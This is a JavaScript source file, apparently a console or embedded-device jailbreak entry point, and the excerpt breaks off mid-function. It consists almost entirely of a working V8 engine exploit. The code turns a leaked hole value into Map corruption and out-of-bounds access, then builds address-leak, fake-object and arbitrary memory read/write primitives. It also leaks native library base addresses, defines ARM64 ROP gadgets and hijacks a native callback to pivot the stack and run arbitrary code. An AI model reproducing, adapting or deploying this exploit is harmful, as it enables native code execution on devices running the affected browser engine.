// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Gezine. See LICENSES/Gezine-MIT.txt.
// CivSwitch by Gezine. Source: https://github.com/Gezine/CivSwitch/blob/3238a3e3340fd19a9dbd5cde56f3b50f9bc5d97f/core.js
(async function() {

    if (window.__xs_loaded) {
        return;
    }
    window.__xs_loaded = true;

    Sound.volumeSetMaster(0);

    document.body.innerHTML='';
    
    window.log = function lazyLog(msg) {
        var MAX  = 37;
        var COLS = 146;
        var FS   = window.innerHeight / MAX * 0.95;
    
        var pre = document.createElement('pre');
        Object.assign(pre.style, {
            position:  'fixed',
            top:       '0',
            left:      '0',
            right:     '0',
            bottom:    '0',
            margin:    '0',
            padding:   '8px',
            overflow:  'hidden',
            fontFamily:'monospace',
            fontSize:  FS + 'px',
            lineHeight:'1.0',
            background:'#000',
            color:     '#fff',
            whiteSpace:'pre',
        });
        document.body.appendChild(pre);
    
        var lines = [];
    
        function splitToRows(text) {
            if (!text) return ['\u00A0'];
            var rows = [], t = text;
            while (t.length > COLS) { rows.push(t.slice(0, COLS)); t = t.slice(COLS); }
            rows.push(t);
            return rows;
        }
    
        var tail = Promise.resolve();
    
        window.log = function log(msg) {
            tail = tail.then(function() {
                String(msg).split('\n').forEach(function(part) {
                    splitToRows(part).forEach(function(row) { lines.push(row); });
                });
                while (lines.length > MAX) lines.shift();
                pre.textContent = lines.join('\n');
                return new Promise(resolve => requestAnimationFrame(resolve));
            });
            return tail;
        };
    
        return window.log(msg);
    };
    
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    function toHex(num) {
        return '0x' + BigInt(num).toString(16).padStart(16, '0');
    }
    
    // https://github.com/NetflixNHack/Netflix-N-Hack/blob/main/inject.js
    // https://github.com/ufm42/Netflix-N-Hack/blob/main/inject.js
    // Pointer compression is enabled like PS5 Netflix
    
    const buf = new ArrayBuffer(8);
    const view = new DataView(buf);
    const ptr = {
        il2ih(value) {
            return value << 0x20n;
        },
        ih2il(value) {
            return value >> 0x20n;
        },
        ih(value) {
            return value & ~0xFFFFFFFFn;
        },
        il(value) {
            return value & 0xFFFFFFFFn;
        },
        itag(value) {
            return value | 1n;
        },
        iuntag(value) {
            return value & ~1n;
        },
        f2i(value) {
            view.setFloat64(0, value, true);
            return view.getBigUint64(0, true);
        },
        f2ih(value) {
            view.setFloat64(0, value, true);
            return BigInt(view.getUint32(4, true));
        },
        f2il(value) {
            view.setFloat64(0, value, true);
            return BigInt(view.getUint32(0, true));
        },
        i2f(value) {
            view.setBigUint64(0, value, true);
            return view.getFloat64(0, true);
        }
    }
    // #endregion
    
    function make_hole () {
        let v1;
        function f0(v4) {
            v4(() => { }, v5 => {
                v1 = v5.errors;
            });
        }
        f0.resolve = function (v6) {
            return v6;
        };
        let v3 = {
            then(v7, v8) {
                v8();
            }
        };
        Promise.any.call(f0, [v3]);
        return v1[1];
    }
    
    try {
        const stable_array = new Array(0x10000);

        let hole = make_hole();

        let string = "TEXT";

        gc();

        let oob_arr_temp = null;
        let VICTIM_MARKERS, OOB2_MARKERS;
        let victim_arr, sentinel_obj, obj_arr, cage_arr, oob2;
        let double_template, template_biguint, template_obj_arr, string2;

        for (let attempt = 0; attempt < 8 && oob_arr_temp === null; attempt++) {
            let map1 = new Map();
            map1.set(1, 1);
            map1.set(hole, 1);

            map1.delete(hole);
            map1.delete(hole);
            map1.delete(1);

            if (map1.size !== -1) {
                continue;
            }

            map1.set(25, -1);
            if (map1.size !== 0) {
                continue;
            }

            let pad = new Array(1, 2, 3);
            let cand = new Array(1.1, 2.2, 3.3);
            VICTIM_MARKERS = [0x5252525111111111n, 0x5252525222222222n, 0x5252525333333333n, 0x5252525444444444n];
            victim_arr = new BigUint64Array(VICTIM_MARKERS);
            sentinel_obj = {};
            obj_arr = new Array(sentinel_obj, sentinel_obj, sentinel_obj, sentinel_obj);
            cage_arr = new Int8Array(8);
            OOB2_MARKERS = [0x3f11111111111111n, 0x3f22222222222222n, 0x3f33333333333333n, 0x3f44444444444444n];
            oob2 = [ptr.i2f(OOB2_MARKERS[0]), ptr.i2f(OOB2_MARKERS[1]),
                    ptr.i2f(OOB2_MARKERS[2]), ptr.i2f(OOB2_MARKERS[3])];

            double_template = new Array(0x10);
            double_template.fill(3.14);
            template_biguint = new BigUint64Array(64);

            void template_biguint.buffer;
            template_obj_arr = [{},{}];
            string2 = "TEXT2";

            map1.set(cand, 0x200);
            if (cand.length === 512) {
                oob_arr_temp = cand;
            }
        }

        if (oob_arr_temp === null) {
            throw new Error("Failed to corrupt oob_arr_temp length");
        }

        oob_arr_temp.pwn = 1;

        if ((fr32(0) & 1n) !== 1n) {
            throw new Error("Unsupported corruption shape. Try again.");
        }
        const jsarr_addr = fr32(0) & ~1n;
        {
            const pre_words = oob_arr_temp.length * 2;
            for (let i = 0; i + 6 < pre_words; i++) {
                if (fr64w(i) === OOB2_MARKERS[0] && fr64w(i + 2) === OOB2_MARKERS[1] &&
                    fr64w(i + 4) === OOB2_MARKERS[2] && fr64w(i + 6) === OOB2_MARKERS[3]) {
                    fw32(2, fr32(i - 2));
                    break;
                }
            }
            fw32(3, 0x400n);
            fw32(0, (jsarr_addr + 0x10n) | 1n);
        }

        function fr64(slot) { 
            return ptr.f2i(oob_arr_temp[slot]); 
        }
        
        function fw64(slot, value) { 
            oob_arr_temp[slot] = ptr.i2f(value); 
        }
        
        function fr32(word) {
            let v = fr64(word >> 1);
            return (word & 1) ? (v >> 32n) : (v & 0xffffffffn);
        }
        
        function fw32(word, value) {
            let slot = word >> 1;
            let cur = fr64(slot);
            let v = BigInt(value) & 0xffffffffn;
            if (word & 1) fw64(slot, (cur & 0xffffffffn) | (v << 32n));
            else fw64(slot, (cur & ~0xffffffffn) | v);
        }
        
        function fr64w(word) { 
            return fr32(word) | (fr32(word + 1) << 32n); 
        }
        
        function fw64w(word, value) {
            fw32(word, value & 0xffffffffn);
            fw32(word + 1, (value >> 32n) & 0xffffffffn);
        }
        
        const SCAN_MAX = 0x200;
        const scan_words = Math.min(oob_arr_temp.length, SCAN_MAX) * 2;

        let self_ptr = 0n, view_base = 0n;
        let obj_arr_elem0_word = -1;
        let victim_ext_word = -1, victim_base_word = -1;

        function scan_positions() {
            view_base = jsarr_addr + 0x18n;
            self_ptr = jsarr_addr | 1n;

            obj_arr_elem0_word = -1;
            for (let i = 0; i + 5 < scan_words; i++) {
                if ((fr32(i) & 1n) !== 1n) continue;
                if (fr32(i + 1) !== 8n) continue;
                let p0 = fr32(i + 2);
                if (p0 === 0n || (p0 & 1n) !== 1n) continue;
                if (fr32(i + 3) !== p0 || fr32(i + 4) !== p0 || fr32(i + 5) !== p0) continue;
                obj_arr[0] = oob_arr_temp;
                let probe = fr32(i + 2);
                obj_arr[0] = sentinel_obj;
                if (probe !== self_ptr) continue;
                obj_arr_elem0_word = i + 2;
                break;
            }
            if (obj_arr_elem0_word < 0) {
                throw new Error("Failed to locate obj_arr elements. Try again.");
            }
            
            let addr_victim = addrof_unstable(victim_arr);
            let w_v = addr_to_word(addr_victim);
            if (fr32(w_v + 4) !== 0n || fr32(w_v + 5) !== 0n ||      // byte_offset == 0
                fr32(w_v + 6) !== 0x20n || fr32(w_v + 7) !== 0n ||   // byte_length == 0x20
                fr32(w_v + 8) !== 4n || fr32(w_v + 9) !== 0n) {      // length == 4
                throw new Error("Bad victim header. Try again.");
            }
            victim_ext_word = w_v + 10;
            victim_base_word = w_v + 12;
        }
        scan_positions();
        
        function addr_to_word(addr) {
            let w = (addr - view_base) >> 2n;
            if (w < 0n || w + 14n > BigInt(scan_words)) {
                throw new Error("Object outside the view. Try again.");
            }
            return Number(w);
        }
        
        let cage_base = 0n;
        let addr_cage = addrof_unstable(cage_arr);
        let w_c = addr_to_word(addr_cage);
        if (fr32(w_c + 6) === 0x8n && fr32(w_c + 7) === 0n &&    // byte_length == 8
            fr32(w_c + 8) === 0x8n && fr32(w_c + 9) === 0n &&    // length == 8
            (fr32(w_c + 12) & 1n) === 1n) {                      // on-heap: base tagged
            let ext = fr64w(w_c + 10);
            if (ext !== 0n) cage_base = ext & ~0xffffffffn;
        }
        
        if (cage_base === 0n) {
            let oob2_addr = addrof_unstable(oob2);
            let w_o2 = addr_to_word(oob2_addr);
            let oob2_fda = fr32(w_o2 + 2) - 1n;  // oob2's elements (compressed, untagged)
            let page_start = oob2_fda & ~0x3ffffn;  // kPageSizeBits == 18
            fw32(w_o2 + 2, ((page_start + 0x18n) & 0xffffffffn) | 1n);
            let area_end = ptr.f2i(oob2[0]);
            fw32(w_o2 + 2, (oob2_fda & 0xffffffffn) | 1n);
            let area_end_low = area_end & 0xffffffffn;
            if (area_end_low <= page_start || area_end_low - page_start > 0x40000n) {
                throw new Error("Bad page header. Try again.");
            }
            cage_base = area_end & ~0xffffffffn;
        }
        if (cage_base === 0n) {
            throw new Error("Failed to recover cage base. Try again.");
        }
        
        function addrof_unstable(obj) {
            obj_arr[0] = obj;
            return fr32(obj_arr_elem0_word) - 1n;
        }
        
        function create_fakeobj_unstable(addr) {
            let original_val = fr32(obj_arr_elem0_word);
            fw32(obj_arr_elem0_word, (addr + 1n) & 0xffffffffn);
            const fake_obj = obj_arr[0];
            fw32(obj_arr_elem0_word, original_val);
            return fake_obj;
        }
        
        function read64_unstable(addr) {
            const orig_ext = fr64w(victim_ext_word);
            const orig_base = fr32(victim_base_word);
        
            fw64w(victim_ext_word, cage_base + (addr & 0xffffffffn));
            fw32(victim_base_word, 0n);
        
            const val = victim_arr[0];
        
            fw64w(victim_ext_word, orig_ext);
            fw32(victim_base_word, orig_base);
        
            return val;
        }
        
        function write64_unstable(addr, value) {
            const orig_ext = fr64w(victim_ext_word);
            const orig_base = fr32(victim_base_word);
        
            fw64w(victim_ext_word, cage_base + (addr & 0xffffffffn));
            fw32(victim_base_word, 0n);
        
            victim_arr[0] = value;
        
            fw64w(victim_ext_word, orig_ext);
            fw32(victim_base_word, orig_base);
        }

        function read32_unstable(addr){
            let read = read64_unstable(addr);
            return read & 0xffffffffn;
        }

        function write32_unstable(addr, value) {
            let read = read64_unstable(addr);
            let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
            write64_unstable(addr, new_value);
        }      
        
        let addr_string = addrof_unstable(string) + 12n;
        if (addr_string < 0n || addr_string > 0x40000000n) {
            throw new Error("addrof out of range. Try again.");
        }
        let string_value = read32_unstable(addr_string);
        if (BigInt(string_value) !== 0x54584554n) {
            throw new Error("Could not create unstable primitives. Try again.");
        }

        await log("Got unstable rw primitive");
        
        /***** Start of Stable Primitives based on fake obj *****/

        let top32b_heap = cage_base >> 32n;
        // await log("Base heap address: " + toHex(cage_base));
        // await log("Top 32bits heap address: " + toHex(top32b_heap));
        
        // Get FixedDoubleArray map from a template (allocated before the freeze)
        const double_template_addr = addrof_unstable(double_template);
        const double_elements_addr = read32_unstable(double_template_addr + 0x8n) - 1n;
        const fixed_double_array_map = read32_unstable(double_elements_addr + 0x00n);
    
        // Get stable_array addresses
        const stable_array_addr = addrof_unstable(stable_array);
        const stable_elements_addr = read32_unstable(stable_array_addr + 0x8n) - 1n;
    
        // await log('Large Object Space @ ' + toHex(stable_elements_addr));
    
        // Transform elements to FixedDoubleArray
        // This makes GC happy later
        write32_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
    
        // await log('Converted stable_array to double array');
    
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = 0;
        }
    
        //await log("Reserved space filled with 0s");
        
        // Get templates for stable primitives (allocated before the freeze)
    
        /***** Template for BigUint64Array *****/
        const template_biguint_addr = addrof_unstable(template_biguint);
        const biguint_map =      read32_unstable(template_biguint_addr + 0x00n);
        const biguint_props =    read32_unstable(template_biguint_addr + 0x04n);
        const biguint_elements = read32_unstable(template_biguint_addr + 0x08n) - 1n;
        const biguint_buffer =   read32_unstable(template_biguint_addr + 0x0Cn) - 1n;
    
        const biguint_elem_map = read32_unstable(biguint_elements + 0x00n);
        const biguint_elem_len = read32_unstable(biguint_elements + 0x04n);
    
    
        /***** Template for Object Array *****/
        const template_obj_arr_addr = addrof_unstable(template_obj_arr);
        const obj_arr_map =      read32_unstable(template_obj_arr_addr + 0x00n);
        const obj_arr_props =    read32_unstable(template_obj_arr_addr + 0x04n);
        const obj_arr_elements = read32_unstable(template_obj_arr_addr + 0x08n) - 1n;
        const obj_arr_len =      read32_unstable(template_obj_arr_addr + 0x0Cn);
    
        const obj_arr_elem_map = read32_unstable(obj_arr_elements + 0x00n);
        const obj_arr_elem_len = read32_unstable(obj_arr_elements + 0x04n);
    
        // await log('Templates extracted');
    
        function stamp_fake_buffer(fake_buffer) {
            for (let off = 0n; off < 0x30n; off += 4n) {
                write32_unstable(fake_buffer + off, read32_unstable(biguint_buffer + off));
            }
            write64_unstable(fake_buffer + 0x24n, 0n);  // extension := null
        }

        const base = stable_elements_addr + 0x100n;
        
        // Inside fake_rw_data: fake Array's elements (at the beginning)
        const fake_rw_obj =             base + 0x0000n;
        const fake_rw_obj_buffer =      base + 0x0040n;
        const fake_rw_obj_elements =    base + 0x1000n;
    
        const fake_bui64_arr_obj =      base + 0x0100n;
        const fake_bui64_arr_buffer =   base + 0x0150n;
        const fake_bui64_arr_elements = base + 0x1100n;
    
        const fake_obj_arr_obj =        base + 0x0200n;
        const fake_obj_arr_elements =   base + 0x0250n;
    
        const fake_fgn =                base + 0x1200n; // No need of fake obj
        const fake_rop_return =         base + 0x1250n; // No need of fake obj
        const fake_chi =                base + 0x1300n; // No need of fake obj
        
        const fake_rop_arr_obj =        base + 0x2000n;
        const fake_rop_arr_buffer =     base + 0x2200n;
        const fake_rop_arr_elements =   base + 0x2100n;

        stamp_fake_buffer(fake_rw_obj_buffer);
    
        write32_unstable(fake_rw_obj_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_rw_obj_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
    
        write32_unstable(fake_rw_obj + 0x00n, biguint_map);
        write32_unstable(fake_rw_obj + 0x04n, biguint_props);
        write32_unstable(fake_rw_obj + 0x08n, fake_rw_obj_elements + 1n);
        write32_unstable(fake_rw_obj + 0x0Cn, fake_rw_obj_buffer + 1n);
        write64_unstable(fake_rw_obj + 0x18n, 0x8000n);      // Fake size in bytes
        write64_unstable(fake_rw_obj + 0x20n, 0x1000n);      // Fake size in elements
        write32_unstable(fake_rw_obj + 0x28n, fake_rw_obj_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_rw_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_rw_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_rw_obj + 0x34n, 0n);  // base_pointer upper 32b


        stamp_fake_buffer(fake_bui64_arr_buffer);
    
        write32_unstable(fake_bui64_arr_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_bui64_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
    
        write32_unstable(fake_bui64_arr_obj + 0x00n, biguint_map);
        write32_unstable(fake_bui64_arr_obj + 0x04n, biguint_props);
        write32_unstable(fake_bui64_arr_obj + 0x08n, fake_bui64_arr_elements + 1n);
        write32_unstable(fake_bui64_arr_obj + 0x0Cn, fake_bui64_arr_buffer + 1n);
        write64_unstable(fake_bui64_arr_obj + 0x18n, 0x40n);      // Fake size in bytes
        write64_unstable(fake_bui64_arr_obj + 0x20n, 0x08n);      // Fake size in elements
        write32_unstable(fake_bui64_arr_obj + 0x28n, fake_bui64_arr_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_bui64_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_bui64_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_bui64_arr_obj + 0x34n, 0n);  // base_pointer upper 32b


        write32_unstable(fake_obj_arr_obj + 0x00n, obj_arr_map);
        write32_unstable(fake_obj_arr_obj + 0x04n, obj_arr_props);
        write32_unstable(fake_obj_arr_obj + 0x08n, fake_obj_arr_elements+1n);
        write32_unstable(fake_obj_arr_obj + 0x0cn, obj_arr_len);      // byte_length lower 32b
    
        write32_unstable(fake_obj_arr_elements + 0x00n, obj_arr_elem_map);
        write32_unstable(fake_obj_arr_elements + 0x04n, obj_arr_elem_len);  // size in bytes << 1


        stamp_fake_buffer(fake_rop_arr_buffer);
    
        write32_unstable(fake_rop_arr_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_rop_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
    
        write32_unstable(fake_rop_arr_obj + 0x00n, biguint_map);
        write32_unstable(fake_rop_arr_obj + 0x04n, biguint_props);
        write32_unstable(fake_rop_arr_obj + 0x08n, fake_rop_arr_elements + 1n);
        write32_unstable(fake_rop_arr_obj + 0x0Cn, fake_rop_arr_buffer + 1n);
        write64_unstable(fake_rop_arr_obj + 0x18n, 0x8000n);      // Fake size in bytes
        write64_unstable(fake_rop_arr_obj + 0x20n, 0x1000n);      // Fake size in elements
        write32_unstable(fake_rop_arr_obj + 0x28n, fake_rop_arr_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_rop_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_rop_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_rop_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
    
        // Materialize fake objects
        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
        // let fake_rw_addr = addrof_unstable(fake_rw);
        //await log("This is the addr of fake_rw materialized : " + toHex(fake_rw_addr));
    
        const fake_victim = create_fakeobj_unstable(fake_bui64_arr_obj);
        // let fake_victim_addr = addrof_unstable(fake_victim);
        //await log("This is the addr of fake_victim materialized : " + toHex(fake_victim_addr));
    
        const fake_obj_arr = create_fakeobj_unstable(fake_obj_arr_obj);
        // let fake_obj_arr_addr = addrof_unstable(fake_obj_arr);
        //await log("This is the addr of fake_obj_arr materialized : " + toHex(fake_obj_arr_addr));
    
        const fake_rop = create_fakeobj_unstable(fake_rop_arr_obj);
        // let fake_rop_addr = addrof_unstable(fake_rop);
        //await log("This is the addr of fake_rop materialized : " + toHex(fake_rop_addr));
        
        // Now we have OOB, Victim and Obj to make stable primitives

        function addrof_compressed(obj) {
            fake_obj_arr[0] = obj;
            let ret = (fake_rw[59] & 0xffffffffn) - 1n;
            fake_obj_arr[0] = 0;
            return ret;
        }

        function read64_compressed(addr) {
            let addr_32 = addr & 0xffffffffn; // Just in case
            let original_value = fake_rw[21];
            fake_rw[21] = cage_base + addr_32; // external_ptr of buffer
            let read_value = fake_victim[0];
            fake_rw[21] = original_value;
            return read_value;
        }

        function write64_compressed(addr, value) {
            let addr_32 = addr & 0xffffffffn; // Just in case
            let original_value = fake_rw[21];
            fake_rw[21] = cage_base + addr_32; // external_ptr of buffer
            fake_victim[0] = value;
            fake_rw[21] = original_value;
        }

        function read32_compressed(addr){
            let read = read64_compressed(addr);
            return  read & 0xffffffffn;
        }

        function write32_compressed(addr, value) {
            let read = read64_compressed(addr);
            let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
            write64_compressed(addr, new_value);
        }

        function read16_compressed(addr){
            let read = read64_compressed(addr);
            return  read & 0xffffn;
        }

        function write16_compressed(addr, value) {
            let read = read64_compressed(addr);
            let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
            write64_compressed(addr, new_value);
        }

        function read8_compressed(addr){
            let read = read64_compressed(addr);
            return  read & 0xffn;
        }

        function write8_compressed(addr, value) {
            let read = read64_compressed(addr);
            let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
            write64_compressed(addr, new_value);
        }
        
        function addrof(obj) {
            fake_obj_arr[0] = obj;
            let ret = cage_base + (fake_rw[59] & 0xffffffffn) - 1n;
            fake_obj_arr[0] = 0;
            return ret;
        }

        function read64(addr) {
            let original_value = fake_rw[21];
            fake_rw[21] = addr;
            let read_value = fake_victim[0];
            fake_rw[21] = original_value;
            return read_value;
        }

        function write64(addr, value) {
            let original_value = fake_rw[21];
            fake_rw[21] = addr;
            fake_victim[0] = value;
            fake_rw[21] = original_value;
        }

        function read32(addr){
            let read = read64(addr);
            return read & 0xffffffffn;
        }

        function write32(addr, value) {
            let read = read64(addr);
            let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
            write64(addr, new_value);
        }

        function read16(addr){
            let read = read64(addr);
            return  read & 0xffffn;
        }

        function write16(addr, value) {
            let read = read64(addr);
            let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
            write64(addr, new_value);
        }

        function read8(addr){
            let read = read64(addr);
            return  read & 0xffn;
        }

        function write8(addr, value) {
            let read = read64(addr);
            let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
            write64(addr, new_value);
        }

        let addr_string2 = addrof(string2) + 12n;
        let string2_value = read32(addr_string2);
        if (BigInt(string2_value) !== 0x54584554n) {
            throw new Error("Could not create stable primitives. Try again.");
        }

        let donor = [0.0, 0.0];
        let donor_elem = read32(addrof(donor) + 8n);
        write64(cage_base + jsarr_addr + 8n, (4n << 32n) | (donor_elem & 0xffffffffn));

        await log("Got stable rw primitive");

        function get_backing_store(typed_array) {
            const obj_addr = addrof_compressed(typed_array);
            const external = read64_compressed(obj_addr + 0x28n);
            const base = read64_compressed(obj_addr + 0x30n);
            return base + external;
        }        
        
        function read_buffer(addr, len) {
            const buffer = new Uint8Array(Number(len));
            for (let i = 0; i < len; i++) {
                buffer[i] = Number(read8(addr + BigInt(i)));
            }
            return buffer;
        }
        
        function write_buffer(addr, buffer) {
            for (let i = 0; i < buffer.length; i++) {
                write8(addr + BigInt(i), buffer[i]);
            }
        }

        function text_encode(str) {
            const utf8_str = unescape(encodeURIComponent(str));
            const bytes = new Uint8Array(utf8_str.length);
            for (let i = 0; i < utf8_str.length; i++) {
                bytes[i] = utf8_str.charCodeAt(i);
            }
            return bytes;
        }

        // Write UTF-8 string to existing buffer
        function write_string(addr, str) {
            const bytes = text_encode(str);
            
            for (let i = 0; i < bytes.length; i++) {
                write8(addr + BigInt(i), bytes[i]);
            }
            
            write8(addr + BigInt(bytes.length), 0);
        }
        
        function bytes_to_string(bytes) {
            let binary = "";
            for (let i = 0; i < bytes.length; i++) {
                binary += String.fromCharCode(bytes[i]);
            }
            return decodeURIComponent(escape(binary));
        }
        
        function read_null_terminated_string(addr) {
            let all_bytes = [];
            
            while (true) {
                const chunk = read_buffer(addr, 0x8);
                if (!chunk || chunk.length === 0) break;
                
                let null_pos = -1;
                for (let i = 0; i < chunk.length; i++) {
                    if (chunk[i] === 0) {
                        null_pos = i;
                        break;
                    }
                }
                
                if (null_pos >= 0) {
                    for (let i = 0; i < null_pos; i++) all_bytes.push(chunk[i]);
                    break;
                }
                
                for (let i = 0; i < chunk.length; i++) all_bytes.push(chunk[i]);
                addr = addr + BigInt(chunk.length);
            }
            
            return bytes_to_string(all_bytes);
        }

        // JSFunction object for window.v8Version (custom native callback)
        const winv8_addr = addrof_compressed(window.v8Version);
        
        // SharedFunctionInfo: shared metadata for the function
        // JSFunction+0x0C = shared_function_info field
        const sfi_addr = read32_compressed(winv8_addr + 0x0Cn) - 1n;
        
        // FunctionTemplateInfo: the C++ template that created this function
        // SharedFunctionInfo+0x04 = function_data field (kFunctionDataOffset)
        const fti_addr = read32_compressed(sfi_addr + 0x04n) - 1n;
        
        // CallHandlerInfo: holds the actual native callback information
        // FunctionTemplateInfo+0x18 = call_code field
        const chi_addr = read32_compressed(fti_addr + 0x18n) - 1n;
        
        // Foreign: V8 wrapper object around a raw C++ pointer
        // CallHandlerInfo+0x04 = callback field (first field after map)
        const fgn_addr = read32_compressed(chi_addr + 0x04n) - 1n;
        
        // Executable address: raw 64-bit C++ function pointer (sub_1AF7FF0)
        // Foreign+0x04 = foreign_address field (kForeignAddressOffset=4, untagged ExternalPointer)
        const exe_addr = read64_compressed(fgn_addr + 0x04n);
        
        const main_base = exe_addr - 0x1AF7FA0n; // sub_1AF7FA0
        const F_calloc = main_base + 0x515b50n;
        const F_free = main_base + 0x515a60n;
        await log("main_base : " + toHex(main_base));
        
        const memcpy_addr = read64(main_base + 0x4DC6088n);
        // await log("memcpy_addr : " + toHex(memcpy_addr));
        
        const sdk_base = memcpy_addr - 0x5224E0n;
        await log("sdk_base : " + toHex(sdk_base));        
        
        // x19 = FCA object*    
        // x20 = Isolate*       
        // x21 = fake_chi_full | 1   
        // x22 = gadget addr
        // x23 = caller's x23   
        // x24 = caller's x24   
        // x30 = 0x2450084

        const rop_chain_addr = get_backing_store(fake_rop) + 0x4008n; // align 0x10
        // await log("rop_chain @ " + toHex(rop_chain_addr));
                
        const fake_chi_full = cage_base + fake_chi;
        const fake_rop_return_full = cage_base + fake_rop_return;
        const rop_epilogue = main_base + 0x2450084n;

        // sp leak
        const gadget1 = main_base + 0x3428ec4n; // ldr x9, [x21, #0x60] ; ldr x1, [x21, #0x50] ; ldr x0, [x21, #0x68] ; blr x9 ; 
        const gadget2 = main_base + 0x130ac30n; // add x1, sp, #0x10 ; ldr x8, [x0] ; ldr x8, [x8, #0x30] ; blr x8 ;
        const gadget3 = main_base + 0x2214004n; // ldr x8, [x0] ; str x1, [x21, #0x10] ; ldr x8, [x8] ; blr x8 ; 
        
        // x19 leak
        const gadget4 = main_base + 0x2188610n; // str x19, [x21, #0x6f8] ; mov x1, x20 ; mov x2, x19 ; ldr x8, [x0] ; ldr x8, [x8, #0x60] ; blr x8 ;
        
        // x20 leak
        const gadget5 = main_base + 0x21886fcn; // str x20, [x21, #0x720] ; mov x1, x20 ; mov x2, x19 ; ldr x8, [x0] ; ldr x8, [x8, #0x80] ; blr x8 ;

        // sp pivot
        const gadget6 = sdk_base + 0x1c534n // ldr x19, [x0, #0x28] ; ldr x8, [x19, #0x18] ; blr x8 ;
        const gadget7 = main_base + 0x102fa60n // ldr x20, [x0, #0x318] ; ldr x0, [x0, #0x2f8] ; ldr x8, [x0] ; ldr x8, [x8, #0x80] ; sub x1, x29, #8 ; blr x8 ;
        const gadget8 = main_base + 0x29b25fcn // mov x29, x20 ; ldr x8, [x19] ; ldr s0, [x20] ; ldr s1, [x29, #4]! ; blr x8 ;
        const gadget9 = main_base + 0x71dee8n // mov sp, x29 ; ldp x29, x30, [sp], #0x10 ; ret  ;
        
        // args
        const gadget10 = main_base + 0x2e09e3cn; // ldp x2, x3, [sp, #0x10] ; ldp x0, x1, [sp], #0x20 ; ldp x4, x5, [sp], #0x10 ; mov sp, x29 ; ldp x29, x30, [sp], #0x10 ; ret  ; 

        // register backup
        const gadget19 = main_base + 0x2b3be1cn // stp x23, x24, [sp, #-0x10]! ; stp x25, x26, [sp, #-0x10]! ; stp x27, x28, [sp, #-0x10]! ; stp x29, x30, [sp, #-0x10]! ; mov x29, sp ; mov x7, x2 ; mov x2, sp ; blr x7 ;
        const gadget20 = main_base + 0x23fb6f4n // add sp, sp, #0x200 ; ldp x29, x30, [sp], #0x10 ; ret  ; 
        
        // function set
        const gadget11 = main_base + 0x1c4n // ldp x20, x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret  ;
        const gadget12 = main_base + 0xca74c8n; // ldr x8, [x20] ; ldp x20, x19, [sp, #0x20] ; ldp x22, x21, [sp, #0x10] ; ldr x6, [x8, #0x18] ; ldp x29, x30, [sp], #0x30 ; br x6 ;
        
        // return value
        const gadget13 = main_base + 0x39b4n; // ldr x21, [sp, #0x10] ; ldp x29, x30, [sp], #0x30 ; ret  ;
        const gadget14 = main_base + 0x2c97530n; // str x0, [x21] ; ldp x30, x21, [sp], #0x20 ; ret  ; 

        // register restore
        const gadget21 = main_base + 0xcd7d8n // ldp x22, x21, [sp, #0xb0] ; ldp x24, x23, [sp, #0xa0] ; ldp x26, x25, [sp, #0x90] ; ldp x28, x27, [sp, #0x80] ; ldp x29, x30, [sp, #0x70] ; add sp, sp, #0xd0 ; ret  ;
        
        // sp restore
        const gadget15 = main_base + 0xdc6f1cn; // ldr x1, [sp, #8] ; ldp x20, x19, [sp, #0x20] ; mov x0, x1 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x30 ; ret  ;
        const gadget16 = main_base + 0x1d0d8d0n; // ldr x0, [x0, #0x10] ; ldr x8, [x0] ; ldr x1, [x8, #0x60] ; br x1 ;
        const gadget17 = main_base + 0x30464ecn; // ldp x29, x30, [sp, #8] ; ldr x4, [x8, #0x20] ; ldr d8, [sp], #0x30 ; br x4 ;
        const gadget18 = sdk_base + 0x5e1820n; // ldr x16, [x0, #0xf8] ; ldp x0, x1, [x0] ; mov sp, x16 ; ret  ;

        
        // Overwrite chi to point to fake_chi
        write32_compressed(fti_addr + 0x18n, fake_chi + 1n);
        
        // Create fake_chi
        const chi_map      = read32_compressed(chi_addr + 0x00n);
        const chi_callback = read32_compressed(chi_addr + 0x08n);
        const chi_data     = read32_compressed(chi_addr + 0x0Cn);
        write32_compressed(fake_chi + 0x00n, chi_map);
        write32_compressed(fake_chi + 0x04n, fake_fgn + 1n);
        write32_compressed(fake_chi + 0x08n, chi_callback);
        write32_compressed(fake_chi + 0x0Cn, chi_data);
        
        // Create fake_fgn
        const fgn_map = read32_compressed(fgn_addr + 0x00n);
        write32_compressed(fake_fgn + 0x00n, fgn_map);
        write64_compressed(fake_fgn + 0x04n, gadget1);
        
        // Do not make this async unless you know what you are doing
        function call_rop(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {

            // -- x19 leak -------------------------------------------------
            // gadget4: str x19, [x21, #0x6f8] ; ... ; blr x8
            write64(fake_chi_full + 0x60n + 0x1n, gadget4);
